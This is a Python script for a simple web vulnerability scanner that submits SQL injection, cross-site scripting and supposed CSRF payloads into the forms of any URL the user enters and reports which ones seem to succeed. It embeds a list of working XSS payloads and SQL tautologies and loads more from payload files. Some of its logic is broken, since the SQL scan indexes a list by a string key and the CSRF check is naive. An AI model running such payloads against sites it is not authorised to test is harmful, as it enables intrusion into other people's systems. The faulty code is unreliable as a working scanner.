import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re

sql_payloads = []
xss_payloads = []
csrf_payloads = [
    {'param1': 'value1', 'param2': 'value2'},
    {'param1': 'value1', 'param2': '<script>alert(1)</script>'},
    {'param1': 'value1', 'param2': '"><script>alert(1)</script>'},
    {'param1': 'value1', 'param2': "'><script>alert(1)</script>"},
    {'param1': 'value1', 'param2': '" onfocus="alert(1)"'},
    {'param1': 'value1', 'param2': '"><img src="x" onerror="alert(1)">'},
    {'param1': 'value1', 'param2': '"><svg/onload=alert(1)>'},
    {'param1': 'value1', 'param2': '"><details/open/ontoggle=alert(1)>'},
    {'param1': 'value1', 'param2': '"><marquee/onstart=alert(1)>'},
    {'param1': 'value1', 'param2': '"><object/data="javascript:alert(1)">'},
    {'param1': 'value1', 'param2': '"><embed/src="javascript:alert(1)">'},
    {'param1': 'value1', 'param2': '"><keygen/onfocus=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=<script>alert(1)</script>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><script>alert(1)</script>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=\'><script>alert(1)</script>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=" onfocus="alert(1)"&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><img src="x" onerror="alert(1)">&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><svg/onload=alert(1)>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><details/open/ontoggle=alert(1)>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><marquee/onstart=alert(1)>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><object/data="javascript:alert(1)">&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><embed/src="javascript:alert(1)">&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><keygen/onfocus=alert(1)>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=OR 1=1&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=admin\' --&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=1 OR 1=1&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<script>alert(1)</script>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<img src=x onerror=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<svg/onload=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<details open ontoggle=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<marquee onstart=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<object data=javascript:alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<embed src=javascript:alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<keygen onfocus=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=value3'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=1 OR 1=1'}
]

with open('SQLINJECTION.txt','r') as file:
    for line in file:
        line = line.strip()
        sql_payloads.append(line)

with open('XSS.txt','r', encoding='utf-8') as file2:
    for line in file2:
        line = line.strip()
        xss_payloads.append(line)

def get_forms(url):
    try:
        res = requests.get(url, timeout=10)
        res.raise_for_status()
        soup = BeautifulSoup(res.content, "lxml")
        return soup.find_all("form")
    except requests.RequestException as e:
        print(f"[-] Error fetching forms from {url}: {e}")
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type", "text")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"name": input_name, "type": input_type, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def scan_sql_injection(url):
    forms = get_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for payload in sql_payloads:
            if not form_details['inputs']["name"] == "searchfor":
                continue
            data = {}
            for input in form_details["inputs"]:
                if input["type"] == "text":
                    data[input["name"]] = payload
                else:
                    data[input["name"]] = input["value"]
            full_url = urljoin(url, form_details["action"])
            try:
                if form_details["method"] == "post":
                    r = requests.post(full_url, data=data, timeout=10)
                else:
                    r = requests.get(full_url, params=data, timeout=10)
                if r.status_code == 200 and any(error in r.text for error in ["syntax error", "mysql_fetch_array", "you have an error in your SQL syntax", "1064", "Warning: mysql", "Unclosed quotation mark"]):
                    print(f"[+] SQL Injection vulnerability found with payload: {payload} in form: {form_details}")
                else:
                    print(f"[-] No SQL injection vulnerability found with payload: {payload}")
            except requests.RequestException as e:
                print(f"[-] Error connecting to {full_url} with payload {payload}: {e}")

def scan_xss(url):
    forms = get_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for payload in xss_payloads:
            data = {}
            for input in form_details["inputs"]:
                if input["type"] == "text":
                    data[input["name"]] = payload
                else:
                    data[input["name"]] = input["value"]
            full_url = urljoin(url, form_details["action"])
            try:
                if form_details["method"] == "post":
                    r = requests.post(full_url, data=data, timeout=10)
                else:
                    r = requests.get(full_url, params=data, timeout=10)
                if payload in r.text and r.status_code == 200:
                    print(f"[+] XSS vulnerability found with payload: {payload} in form: {form_details}")
                else:
                    print(f"[-] No XSS vulnerability found with payload: {payload}")
            except requests.RequestException as e:
                print(f"[-] Error connecting to {full_url} with payload {payload}: {e}")

def scan_csrf(url):
    forms = get_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for payload in csrf_payloads:
            data = {}
            for input in form_details["inputs"]:
                if input["type"] == "text":
                    data[input["name"]] = payload[input["name"]] if input["name"] in payload else input["value"]
                else:
                    data[input["name"]] = input["value"]
            full_url = urljoin(url, form_details["action"])
            try:
                r = requests.post(full_url, data=data, timeout=10)
                if "csrf_token" not in r.text and r.status_code == 200:
                    print(f"[+] CSRF vulnerability found with payload: {payload} in form: {form_details}")
                else:
                    print(f"[-] No CSRF vulnerability found with payload: {payload}")
            except requests.RequestException as e:
                print(f"[-] Error connecting to {full_url} with payload {payload}: {e}")

def validate_url(url):
    if not re.match(r'^https?://', url):
        return "http://" + url
    return url

def main():
    url = input("Enter the URL to scan: ")
    url = validate_url(url)

    print("Scanning for SQL Injection...")
    scan_sql_injection(url)

    print("\nScanning for XSS...")
    scan_xss(url)

    print("\nScanning for CSRF...")
    scan_csrf(url)

if __name__ == "__main__":
    main()
